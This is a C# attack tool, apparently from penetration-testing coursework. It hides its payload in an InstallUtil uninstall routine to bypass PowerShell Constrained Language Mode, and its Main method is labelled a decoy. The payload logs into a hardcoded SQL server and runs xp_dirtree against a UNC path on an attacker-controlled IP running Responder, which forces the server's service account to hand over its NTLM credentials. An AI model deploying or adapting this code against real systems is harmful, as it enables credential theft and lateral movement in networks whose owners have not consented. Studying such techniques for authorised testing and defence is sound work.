using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;
using System.Data.SqlClient;

namespace CLMBypassUninstallUtil
{
    class Program
    {
        static void Main(string[] args)
        {
            //This section of code is notused. We can put whatever we want here.
            Console.WriteLine("This is the main method which is a decoy");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            //HARDCODED SERVER FQDN HERE
            String sqlServer = "sql05.tricky.com";
            //Default DB name on MS SQL
            String database = "master";

            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }
            //Kali IP where we are hosting responder for connection
            String query = "EXEC master..xp_dirtree \"\\\\192.168.49.84\\\\test\";";
            SqlCommand command = new SqlCommand(query, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();

            con.Close();
        }
    }
}